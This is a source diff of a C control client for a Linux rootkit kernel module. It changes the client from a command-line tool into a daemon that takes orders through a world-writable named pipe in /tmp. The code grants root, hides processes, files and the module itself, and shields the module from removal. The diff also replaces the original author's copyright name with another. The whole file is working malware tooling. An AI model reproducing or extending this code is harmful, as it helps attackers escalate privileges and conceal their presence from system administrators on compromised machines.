@@ -1,5 +1,5 @@
 /*
- * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
+ * Copyright (C) 2016-2017 Arian Suarez 
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -37,201 +37,43 @@
 
 #define MAX_BUF 1024
 
-void print_help(char **argv)
-{
-    printf(
-        "Usage: %s [OPTION]...\n"
-        "\n"
-        "Options:\n"
-        "  --root-shell            Grants you root shell access.\n"
-        "  --hide-pid=PID          Hides the specified PID.\n"
-        "  --unhide-pid=PID        Unhides the specified PID.\n"
-        "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
-        "                          Must be a filename without any path.\n"
-        "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
-        "  --hide                  Hides the rootkit LKM.\n"
-        "  --unhide                Unhides the rootkit LKM.\n"
-        "  --help                  Print this help message.\n"
-        "  --protect               Protects the rootkit from rmmod.\n"
-        "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
-}
+#define ACTIVE 1
+#define INACTIVE 0
 
-void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
-                                   int *unhide_pid, char **pid, int *hide_file,
-                                   int *unhide_file, char **file, int *hide,
-                                   int *unhide, int *protect, int *unprotect)
-{
-    if (argc < 2) {
-        fprintf(stderr, "Error: No arguments provided.\n\n");
-        print_help(argv);
-        exit(1);
-    }
+/*  Get number of words from pipe  */
+int word_count(char *s);
 
-    opterr = 0;
+/*  Read string from pipe */
+void read_from_pipe(char *pipe_name, char *pipe_buf);
 
-    static struct option long_options[] = {
-        {"root-shell",  no_argument,       0, 'a'},
-        {"hide-pid",    required_argument, 0, 'b'},
-        {"unhide-pid",  required_argument, 0, 'c'},
-        {"hide-file",   required_argument, 0, 'd'},
-        {"unhide-file", required_argument, 0, 'e'},
-        {"hide",        no_argument,       0, 'f'},
-        {"unhide",      no_argument,       0, 'g'},
-        {"help",        no_argument,       0, 'h'},
-        {"protect",     no_argument,       0, 'i'},
-        {"unprotect",   no_argument,       0, 'j'},
-        {0,             0,                 0,  0 }
-    };
+/*  Fill write buffer */
+void write_buffer(char **dest_ptr, char *src, size_t size);
 
-    *root = 0;
-    *hide_pid = 0;
-    *unhide_pid = 0;
-    *pid = NULL;
-    *hide_file = 0;
-    *unhide_file = 0;
-    *file = NULL;
-    *hide = 0;
-    *unhide = 0;
-    *protect = 0;
-    *unprotect = 0;
+/*  Separate options from packet */
+void parse_input(char *pkt, char **arg1, char **arg2);
 
-    int opt;
-
-    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1) {
-
-        switch (opt) {
-
-            case 'a':
-                *root = 1;
-                break;
-
-            case 'b':
-                *hide_pid = 1;
-                *pid = optarg;
-                break;
-
-            case 'c':
-                *unhide_pid = 1;
-                *pid = optarg;
-                break;
-
-            case 'd':
-                *hide_file = 1;
-                *file = optarg;
-                break;
-
-            case 'e':
-                *unhide_file = 1;
-                *file = optarg;
-                break;
-
-            case 'f':
-                *hide = 1;
-                break;
-
-            case 'g':
-                *unhide = 1;
-                break;
-
-            case 'h':
-                print_help(argv);
-                exit(0);
-
-            case 'i':
-                *protect = 1;
-                break;
-
-            case 'j':
-                *unprotect = 1;
-                break;
-
-            case '?':
-                fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
-                print_help(argv);
-                exit(1);
-
-            case ':':
-                fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
-                print_help(argv);
-                exit(1);
-        }
-    }
-
-    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
-            + *unhide + *protect + *unprotect) != 1) {
-        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
-        print_help(argv);
-        exit(1);
-    }
-}
-
-void write_buffer(char **dest_ptr, char *src, size_t size)
-{
-    memcpy(*dest_ptr, src, size);
-    *dest_ptr += size;
-}
-
-int word_count(char *s){
-    int i;
-    int count = 1;
-
-    for (i = 0;s[i] != '\0';i++){
-        if (s[i] == ' ')
-            count++;    
-    }
-
-    return count;
-}
-
-void parse_input(char *pkt, char **arg1, char **arg2){
-    printf("parse_input");
-    int count = word_count(pkt);
-    printf("%d\n", count);
-
-    if(count > 1){
-        *arg1 = strtok(pkt, " ");
-        *arg2 = strtok(NULL, " ");
-    }
-    else {
-        *arg1 = strtok(pkt, " ");
-    }
-}
-
-void read_from_pipe(char *pipe_name, char *pipe_buf){
-    
-    /*  Clear buffer */
-    memset(&pipe_buf[0], 0, sizeof(pipe_buf));
-
-    int pipe_fd = open(pipe_name, O_RDONLY);
-    read(pipe_fd, pipe_buf, MAX_BUF);
-    close(pipe_fd);
-}
-
-int root;
-int hide_pid;
-int unhide_pid;
-char *pid;
-int hide_file;
-int unhide_file;
-char *file;
-int hide;
-int unhide;
-int protect;
-int unprotect;
-
-void action();
+/*  Send action to LKM */
+void action(int root, int hide_pid,
+            int unhide_pid, char *pid, int hide_file,
+            int unhide_file, char *file, int hide,
+            int unhide, int protect, int unprotect);
 
 int main(int argc, char **argv)
 {
 
     char *pipe_name = "/tmp/my_fifo";
-    /* char pipe_buf[MAX_BUF]; */
     char pipe_buf[MAX_BUF];
     char *arg1 = malloc(32);
     char *arg2 = malloc(256);
 
     /* create pipe */
     mkfifo(pipe_name, 0666);
+
+    /*  Become root process */
+    action(ACTIVE,  INACTIVE, 
+            INACTIVE, NULL, INACTIVE,
+            INACTIVE, NULL, INACTIVE, 
+            INACTIVE, INACTIVE, INACTIVE);
 
     while(1){
         /*  read from pipe, while loop till pipe has args */
@@ -245,12 +87,70 @@ int main(int argc, char **argv)
         printf("Arg2: %s, len: %d\n", arg2, (int)strlen(arg2));
 
         if (strcmp(arg1, "root") == 0){
-            root = 1;
-            action();
+            action(ACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "touch") == 0){
             printf("touching\n");
             mkfifo("/opt/test", 0666);
+        }
+        if (strcmp(arg1, "hpid") == 0){
+            printf("hpid\n");
+            action(INACTIVE,  ACTIVE, 
+                    INACTIVE, arg2, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "unpid") == 0){
+            printf("unpid\n");
+            action(INACTIVE,  INACTIVE, 
+                    ACTIVE, arg2, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "hfile") == 0){
+            printf("hfile\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, ACTIVE,
+                    INACTIVE, arg2, INACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "unfile") == 0){
+            printf("unfile\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    ACTIVE, arg2, INACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "hide") == 0){
+            printf("hide\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    INACTIVE, NULL, ACTIVE, 
+                    INACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "unhide") == 0){
+            printf("unhide\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    ACTIVE, INACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "protect") == 0){
+            printf("protect\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, ACTIVE, INACTIVE);
+        }
+        if (strcmp(arg1, "unprotect") == 0){
+            printf("unprotect\n");
+            action(INACTIVE,  INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
+                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, INACTIVE, ACTIVE);
         }
 
     }
@@ -258,7 +158,10 @@ int main(int argc, char **argv)
     return 0;
 }
 
-void action(){
+void action(int root, int hide_pid,
+            int unhide_pid, char *pid, int hide_file,
+            int unhide_file, char *file, int hide,
+            int unhide, int protect, int unprotect){
 
     size_t buf_size = 0;
 
@@ -338,7 +241,47 @@ void action(){
     free(buf);
 
     if (root) {
-        /* execl("/bin/bash", "bash", NULL); */
         setuid(0);
     }
+}
+
+void write_buffer(char **dest_ptr, char *src, size_t size){
+    memcpy(*dest_ptr, src, size);
+    *dest_ptr += size;
+}
+
+int word_count(char *s){
+    int i;
+    int count = 1;
+
+    for (i = 0;s[i] != '\0';i++){
+        if (s[i] == ' ')
+            count++;    
+    }
+
+    return count;
+}
+
+void parse_input(char *pkt, char **arg1, char **arg2){
+
+    int count = word_count(pkt);
+
+    if(count > 1){
+        *arg1 = strtok(pkt, " ");
+        *arg2 = strtok(NULL, " ");
+    }
+    else {
+        *arg1 = strtok(pkt, " ");
+    }
+
+}
+
+void read_from_pipe(char *pipe_name, char *pipe_buf){
+    
+    /*  Clear buffer */
+    memset(&pipe_buf[0], 0, sizeof(pipe_buf));
+
+    int pipe_fd = open(pipe_name, O_RDONLY);
+    read(pipe_fd, pipe_buf, MAX_BUF);
+    close(pipe_fd);
 }
